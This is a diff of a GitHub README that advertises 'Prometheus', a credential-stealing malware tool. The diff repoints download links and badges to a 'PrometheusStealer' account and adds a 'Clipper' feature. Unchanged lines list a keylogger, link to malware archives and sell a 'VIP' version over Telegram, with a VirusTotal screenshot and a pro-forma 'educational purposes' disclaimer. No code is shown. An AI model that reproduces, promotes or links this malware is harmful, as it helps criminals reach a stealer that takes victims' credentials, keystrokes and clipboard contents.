@@ -9,13 +9,13 @@
 </p>
 </p>
 <p align="center">
-  <img src="https://img.shields.io/github/languages/top/tin-ka/Prometheus">
+  <img src="https://img.shields.io/github/languages/top/PrometheusStealer/Prometheus">
     <br>
-  <img src="https://img.shields.io/github/stars/tin-ka/Prometheus">
-  <img src="https://img.shields.io/github/forks/tin-ka/Prometheus">
+  <img src="https://img.shields.io/github/stars/PrometheusStealer/Prometheus">
+  <img src="https://img.shields.io/github/forks/PrometheusStealer/Prometheus">
     <br>
   
-    <p align="center">🔥 [Download](https://raw.githubusercontent.com/tin-ka/Prometheus/main/Prometheus.zip) 🔥
+    <p align="center">🔥 [Download](https://raw.githubusercontent.com/PrometheusStealer/Prometheus/main/Prometheus.zip) 🔥
   <br>
   💎 [Contact in Telegram](https://t.me/PrometheusSupport) 💎
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
@@ -32,13 +32,13 @@
 
 ## Download
 
-[Download](https://raw.githubusercontent.com/tin-ka/Prometheus/main/Prometheus.zip)
+[Download](https://raw.githubusercontent.com/PrometheusStealer/Prometheus/main/Prometheus.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
 ## Features
 <p align="center">
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/window.png"/>
+  <img src="https://github.com/PrometheusStealer/Prometheus/blob/main/window.png"/>
 </p>
 FREE Features
 
@@ -93,11 +93,12 @@ FREE Features
 - 💎 Kill Process.
 - 💎 Steals Startup List.
 - 💎 Keylogger.
+- 💎 Clipper.
 - (...more)
   
 ## Stub Settings
 <p align="center">
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/msg.png"/>
+  <img src="https://github.com/PrometheusStealer/Prometheus/blob/main/msg.png"/>
 </p>
 
 | Option           | Description                                            |
@@ -135,9 +136,9 @@ P.S. Password from archive with logs "prometheus"
 
 ## 💎 VIP Version
 <p align="center">
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/virustotal.png"/>
+  <img src="https://github.com/PrometheusStealer/Prometheus/blob/main/virustotal.png"/>
 </p>
 
-💎 [Download VIP](https://raw.githubusercontent.com/tin-ka/Prometheus/main/PrometheusVIP.rar)
+💎 [Download VIP](https://raw.githubusercontent.com/PrometheusStealer/Prometheus/main/PrometheusVIP.rar)
 
 💎 If you want to get the password for the VIP version of Prometheus, you can buy it from me in [Telegram](https://t.me/PrometheusSupport). 
